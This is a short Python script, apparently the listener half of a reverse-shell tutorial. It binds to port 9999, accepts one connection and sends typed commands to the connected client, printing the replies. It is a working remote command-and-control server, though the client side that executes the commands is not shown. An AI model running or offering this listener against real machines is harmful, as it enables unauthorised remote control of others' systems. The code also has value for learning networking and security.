import socket
import sys


def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as e:
        print("Socket Creation error:"+str(e))


def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding socket to port: "+str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as e:
        print("Socket binding error: " + str(e) + "\n" + "retrying....")
        bind_socket()


def accept_socket():
    con, address = s.accept()
    print("connection Established | " + "IP" + address[0] + " |Port" + str(address[1]))
    send_command(con)
    con.close()


def send_command(con):
    while True:
        cmd = input()
        if cmd == 'quit':
            con.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            con.send(str.encode(cmd))
            client_response = str(con.recv(1024), 'utf-8')
            print(client_response, end='')


def main():
    create_socket()
    bind_socket()
    accept_socket()


main()
